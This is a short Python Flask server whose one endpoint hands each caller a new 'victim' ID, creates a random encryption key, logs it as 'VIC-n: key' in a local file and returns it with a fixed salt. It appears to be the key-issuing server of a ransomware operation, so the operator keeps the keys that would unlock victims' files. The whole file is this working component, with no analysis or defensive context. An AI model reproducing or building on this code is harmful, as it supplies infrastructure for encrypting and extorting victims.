from flask import Flask
import secrets

app = Flask(__name__)

keyFile = 'keys.txt'
staticSalt = 'valeggiosulminci'

@app.route('/getKey')
def getKey():
    victimId = None
    victimKey = None

    try:
        victimId = num_lines = sum(1 for line in open(keyFile))
    except FileNotFoundError:
        victimId = 0

    victimKey = secrets.token_hex(16)

    keysFile = open(keyFile, 'a')
    keysFile.write('VIC-' + str(victimId) + ': ' + victimKey + '\n')
    keysFile.close()

    return {
        'key': victimKey,
        'salt': staticSalt
    }
